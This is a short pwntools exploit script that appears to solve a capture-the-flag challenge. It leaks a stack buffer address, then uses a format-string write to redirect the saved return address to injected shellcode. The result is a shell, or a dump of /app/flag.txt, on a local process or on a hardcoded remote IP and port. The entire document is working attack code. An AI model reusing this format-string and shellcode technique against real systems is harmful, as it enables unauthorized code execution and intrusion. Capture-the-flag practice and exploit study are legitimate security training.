#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"

HOST = args.HOST or "13.127.119.28"
PORT = int(args.PORT or 1336)


def build_payload(buf_addr: int) -> bytes:
    saved_rip = buf_addr + 0x418
    shellcode = asm(shellcraft.sh())

    shell_off = 0x80
    for _ in range(10):
        shell_addr = buf_addr + shell_off
        probe = fmtstr_payload(12, {saved_rip: shell_addr}, write_size="short")
        new_off = ((len(probe) + 0x10 + 7) // 8) * 8
        if new_off == shell_off:
            break
        shell_off = new_off

    shell_addr = buf_addr + shell_off
    payload = fmtstr_payload(12, {saved_rip: shell_addr}, write_size="short")
    return payload.ljust(shell_off, b"B") + shellcode


def solve(io):
    banner = io.recvline().decode().strip()
    buf_addr, _ = [int(x, 16) for x in banner.split(", ")]
    io.recvline()

    payload = build_payload(buf_addr)

    io.sendline(b"deposit")
    io.recvuntil(b"Enter amount: ")
    io.sendline(payload)
    io.recvuntil(b"What would you like")

    io.sendline(b"exit")
    if args.SHELL:
        io.interactive()
        return

    io.sendline(b"cat /app/flag.txt")
    data = io.recvrepeat(1)
    print(data.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    if args.REMOTE:
        tube = remote(HOST, PORT)
    else:
        tube = process("./chall")
    solve(tube)
